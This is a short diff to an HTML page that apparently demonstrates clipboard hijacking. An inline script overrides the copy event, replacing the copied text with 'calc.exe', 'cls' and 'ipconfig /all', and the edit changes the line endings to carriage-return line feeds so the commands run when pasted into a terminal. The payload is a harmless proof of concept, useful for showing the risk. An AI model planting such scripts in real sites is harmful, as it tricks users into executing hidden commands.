@@ -28,7 +28,7 @@
 	<script>
 	    document.addEventListener('copy', function(e){
 		console.log(e);
-		e.clipboardData.setData('text/plain', 'calc.exe\ncls\nipconfig /all\n');
+		e.clipboardData.setData('text/plain', 'calc.exe\r\ncls\r\nipconfig /all\r\n');
 		e.preventDefault(); // We want our data, not data from any selection, to be written to the clipboard
 	    });
 	</script>
